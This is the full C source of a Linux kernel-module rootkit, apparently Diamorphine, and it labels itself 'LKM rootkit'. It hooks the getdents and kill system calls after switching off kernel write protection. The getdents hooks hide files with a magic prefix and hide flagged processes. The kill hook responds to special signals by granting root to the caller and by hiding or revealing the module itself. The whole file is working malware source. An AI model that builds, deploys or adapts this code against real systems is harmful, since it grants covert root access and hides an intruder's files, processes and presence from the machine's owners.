#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

#include "diamorphine.h"

#ifndef __pa_symbol
#define __pa_symbol(x) __pa(x)
#endif

#ifndef PROC_ROOT_INO
#ifdef PROCFS_ROOT_INO
#define PROC_ROOT_INO PROCFS_ROOT_INO
#else
#define PROC_ROOT_INO 1
#endif
#endif

#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
unsigned long cr0;
#elif defined(CONFIG_ARM64)
static void (*dia_update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
static unsigned long start_rodata;
static unsigned long init_begin;
#define section_size init_begin - start_rodata
#ifndef PAGE_KERNEL_RO
#define PAGE_KERNEL_RO __pgprot(pgprot_val(PAGE_KERNEL) | PTE_RDONLY)
#endif
#elif defined(CONFIG_ARM)
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 13, 0)
static void (*dia_text_rw)(void);
static void (*dia_text_ro)(void);
#endif
#endif
#if defined(CONFIG_ARM) || defined(CONFIG_ARM64)
static void *dia_syscall_alias;
#endif
static unsigned long *__sys_call_table;
/* Writable view of sys_call_table; differs when using a vmap alias. */
static unsigned long *dia_sys_call_table_w;

#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
void *sys_call;
#endif

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && defined(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
	typedef long (*t_syscall)(const struct pt_regs *);
	static t_syscall orig_getdents64;
	static t_syscall orig_kill;
#ifdef __NR_getdents
	static t_syscall orig_getdents;
#endif
#else
	typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
		struct linux_dirent64 *, unsigned int);
	typedef asmlinkage long (*orig_kill_t)(pid_t, int);
	orig_getdents64_t orig_getdents64;
	orig_kill_t orig_kill;
#ifdef __NR_getdents
	typedef asmlinkage long (*orig_getdents_t)(unsigned int,
            struct linux_dirent *, unsigned int);
	orig_getdents_t orig_getdents;
#endif
#endif


#ifdef KPROBE_LOOKUP
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
// different name to avoid shadowing the real function in kernels that do have
// the symbol.
kallsyms_lookup_name_t kallsyms_lookup_name_ = NULL;
#endif

unsigned long resolve_sym(char *symbol)
{
#ifdef KPROBE_LOOKUP
	if (kallsyms_lookup_name_ == NULL) {
		if (register_kprobe(&kp) < 0 || kp.addr == NULL)
			return 0;
		kallsyms_lookup_name_ = (kallsyms_lookup_name_t) kp.addr;
		unregister_kprobe(&kp);
	}
	return kallsyms_lookup_name_(symbol);
#else
	return kallsyms_lookup_name(symbol);
#endif
}


unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 4, 0)
	unsigned long int i;
#if defined(CONFIG_ARM)
	unsigned long low;
#endif
#endif

	/*
	 * KALLSYMS_ALL exposes sys_call_table even on old kernels, where it is
	 * not exported.  Prefer it over the brute-force scan below.
	 */
	syscall_table = (unsigned long *)resolve_sym("sys_call_table");
	if (syscall_table)
		return syscall_table;

#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 4, 0)
#if defined(CONFIG_ARM)
	/*
	 * On old 32-bit ARM kernels .rodata is placed before .text, so
	 * sys_call_table sits below sys_close and the upward scan can never
	 * find it.  Scan down to _stext as well.
	 */
	low = (unsigned long)resolve_sym("_stext");
	if (low && low < (unsigned long)sys_close) {
		for (i = (unsigned long)sys_close; i >= low;
				i -= sizeof(void *)) {
			syscall_table = (unsigned long *)i;
			if (syscall_table[__NR_close] ==
					(unsigned long)sys_close)
				return syscall_table;
			if (i == low)
				break;
		}
	}
#endif

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
#endif
	return NULL;
}

struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && defined(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
static long hacked_getdents64(const struct pt_regs *pt_regs) {
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
#ifdef CONFIG_X86_64
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#else
	int fd = (int) pt_regs->bx;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->cx;
#endif
#elif defined(CONFIG_ARM64)
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#elif defined(CONFIG_ARM)
	int fd = (int) pt_regs->ARM_r0;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->ARM_r1;
#endif

	int ret = orig_getdents64(pt_regs), err;
#else
asmlinkage long
hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err;
#endif
	unsigned short proc = 0, namelen = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
        namelen = dir->d_reclen - offsetof(struct linux_dirent64, d_name);
		if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

#ifdef __NR_getdents
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && defined(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
static long hacked_getdents(const struct pt_regs *pt_regs) {
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
#ifdef CONFIG_X86_64
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#else
	int fd = (int) pt_regs->bx;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->cx;
#endif
#elif defined(CONFIG_ARM64)
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#elif defined(CONFIG_ARM)
	int fd = (int) pt_regs->ARM_r0;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->ARM_r1;
#endif
	int ret = orig_getdents(pt_regs), err;
#else
asmlinkage long
hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
#endif
	unsigned short proc = 0, namelen = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
        namelen = dir->d_reclen - offsetof(struct linux_dirent, d_name);
		if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}
#endif /* __NR_getdents */

void
give_root(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
		commit_creds(newcreds);
	#endif
}

static inline void
tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;

void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && defined(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
long
hacked_kill(const struct pt_regs *pt_regs)
{
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
#ifdef CONFIG_X86_64
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;
#else
	pid_t pid = (pid_t) pt_regs->bx;
	int sig = (int) pt_regs->cx;
#endif
#elif defined(CONFIG_ARM64)
	pid_t pid = (pid_t) pt_regs->regs[0];
	int sig = (int) pt_regs->regs[1];
#elif defined(CONFIG_ARM)
	pid_t pid = (pid_t) pt_regs->ARM_r0;
	int sig = (int) pt_regs->ARM_r1;
#endif
#else
asmlinkage long
hacked_kill(pid_t pid, int sig)
{
#endif
	struct task_struct *task;
	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && defined(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
			return orig_kill(pt_regs);
#else
			return orig_kill(pid, sig);
#endif
	}
	return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void
write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}
#endif

#if defined(CONFIG_ARM) || defined(CONFIG_ARM64)
/*
 * Older ARM64 kernels have no update_mapping_prot(), and ARM32 >= 5.13
 * removed set_kernel_text_rw()/set_kernel_text_ro().  In both cases the
 * kernel-image mapping of sys_call_table is read-only, while set_memory_rw()
 * only accepts module/vmalloc addresses.  Map the backing physical pages
 * through vmalloc to get a temporary writable alias.
 */
static int
dia_map_syscall_table_alias(void)
{
	unsigned long phys = __pa_symbol((unsigned long)__sys_call_table);
	struct page *pages[2];

	pages[0] = pfn_to_page(phys >> PAGE_SHIFT);
	pages[1] = pfn_to_page((phys >> PAGE_SHIFT) + 1);

	dia_syscall_alias = vmap(pages, 2, VM_MAP, PAGE_KERNEL);
	dia_sys_call_table_w = __sys_call_table;
	if (!dia_syscall_alias)
		return -ENOMEM;

	dia_sys_call_table_w = (unsigned long *)((unsigned long)dia_syscall_alias +
			(phys & ~PAGE_MASK));
	return 0;
}

static void
dia_unmap_syscall_table_alias(void)
{
	if (dia_syscall_alias) {
		vunmap(dia_syscall_alias);
		dia_syscall_alias = NULL;
	}
	dia_sys_call_table_w = __sys_call_table;
}
#endif

static inline void
protect_memory(void)
{
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0);
#else
	write_cr0(cr0);
#endif
#elif defined(CONFIG_ARM64)
	if (dia_update_mapping_prot && start_rodata && init_begin) {
		dia_update_mapping_prot(__pa_symbol(start_rodata),
				(unsigned long)start_rodata,
				section_size, PAGE_KERNEL_RO);
	} else if (dia_syscall_alias) {
		dia_unmap_syscall_table_alias();
	}
#elif defined(CONFIG_ARM)
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 13, 0)
	if (dia_text_ro)
		dia_text_ro();
#else
	dia_unmap_syscall_table_alias();
#endif
#endif
}

static inline void
unprotect_memory(void)
{
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0 & ~0x00010000);
#else
	write_cr0(cr0 & ~0x00010000);
#endif
#elif defined(CONFIG_ARM64)
	if (dia_update_mapping_prot && start_rodata && init_begin) {
		dia_update_mapping_prot(__pa_symbol(start_rodata),
				(unsigned long)start_rodata,
				section_size, PAGE_KERNEL);
		dia_sys_call_table_w = __sys_call_table;
	} else {
		/*
		 * Pre-4.14 arm64 has no update_mapping_prot(), and
		 * set_memory_rw() refuses kernel-image addresses.  Map the
		 * physical pages through vmalloc to get a writable alias.
		 */
		dia_map_syscall_table_alias();
	}
#elif defined(CONFIG_ARM)
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 13, 0)
	if (dia_text_rw)
		dia_text_rw();
#else
	/*
	 * 5.13 removed set_kernel_text_rw()/set_kernel_text_ro(), and
	 * set_memory_rw() refuses kernel-image addresses, so patch the
	 * table through a writable vmalloc alias of its physical pages.
	 */
	dia_map_syscall_table_alias();
#endif
#endif
}

#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
void flipswitch_func(void *target_func, void *hacked_func) {
	unsigned char *func_ptr = (unsigned char *)sys_call;
	size_t i;

	for (i = 0; i < DUMP_SIZE - 4; ++i) {
		if (func_ptr[i] == 0xe9 || func_ptr[i] == 0xe8) {
			int32_t rel = *(int32_t *)(func_ptr + i + 1);
			void *call_addr = (void *)((uintptr_t)sys_call + i + 5 + rel);

			if (call_addr == target_func) {

				int32_t new_rel = (uintptr_t)hacked_func - ((uintptr_t)sys_call + i + 5);
				int hooked_offset = i + 1;

				memcpy(func_ptr + hooked_offset, &new_rel, sizeof(new_rel));
				break;
			}
		}
	}
}
#endif

static int __init
diamorphine_init(void)
{
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;
	dia_sys_call_table_w = __sys_call_table;

#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
	cr0 = read_cr0();
#elif defined(CONFIG_ARM64)
	dia_update_mapping_prot = (void *)resolve_sym("update_mapping_prot");
	start_rodata = (unsigned long)resolve_sym("__start_rodata");
	init_begin = (unsigned long)resolve_sym("__init_begin");
#if defined(CONFIG_STRICT_KERNEL_RWX)
	if (!(dia_update_mapping_prot && start_rodata && init_begin))
		pr_info("diamorphine: using vmap alias for sys_call_table\n");
#endif
#elif defined(CONFIG_ARM)
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 13, 0)
	dia_text_rw = (void *)resolve_sym("set_kernel_text_rw");
	dia_text_ro = (void *)resolve_sym("set_kernel_text_ro");
#if defined(CONFIG_STRICT_KERNEL_RWX)
	if (!dia_text_rw || !dia_text_ro)
		return -1;
#endif
#endif
#endif

	module_hide();
	tidy();

#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
#ifdef CONFIG_X86_64
	sys_call = (void *)resolve_sym("x64_sys_call");
#else
	sys_call = (void *)resolve_sym("ia32_sys_call");
#endif
#endif

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && defined(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
#ifdef __NR_getdents
	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
#endif
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
#else
#ifdef __NR_getdents
	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
#endif
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
#endif

	unprotect_memory();
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
	/*
	 * Kernels that dispatch through x64_sys_call()/ia32_sys_call() do
	 * not use sys_call_table entries directly.  Patch the indirect
	 * call inside the dispatcher instead.  Older kernels neither have
	 * the dispatcher nor use wrappers, so the table write is correct.
	 */
	if (sys_call) {
#ifdef __NR_getdents
		flipswitch_func((void *)orig_getdents,
				(void *)hacked_getdents);
#endif
		flipswitch_func((void *)orig_getdents64,
				(void *)hacked_getdents64);
		flipswitch_func((void *)orig_kill, (void *)hacked_kill);
	} else {
#else
	{
#endif
#ifdef __NR_getdents
		dia_sys_call_table_w[__NR_getdents] =
			(unsigned long) hacked_getdents;
#endif
		dia_sys_call_table_w[__NR_getdents64] =
			(unsigned long) hacked_getdents64;
		dia_sys_call_table_w[__NR_kill] =
			(unsigned long) hacked_kill;
	}
	protect_memory();

	return 0;
}

static void __exit
diamorphine_cleanup(void)
{

	unprotect_memory();
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
	if (sys_call) {
#ifdef __NR_getdents
		flipswitch_func((void *)hacked_getdents,
				(void *)orig_getdents);
#endif
		flipswitch_func((void *)hacked_getdents64,
				(void *)orig_getdents64);
		flipswitch_func((void *)hacked_kill, (void *)orig_kill);
	} else {
#else
	{
#endif
#ifdef __NR_getdents
		dia_sys_call_table_w[__NR_getdents] =
			(unsigned long) orig_getdents;
#endif
		dia_sys_call_table_w[__NR_getdents64] =
			(unsigned long) orig_getdents64;
		dia_sys_call_table_w[__NR_kill] =
			(unsigned long) orig_kill;
	}
	protect_memory();

}

module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");
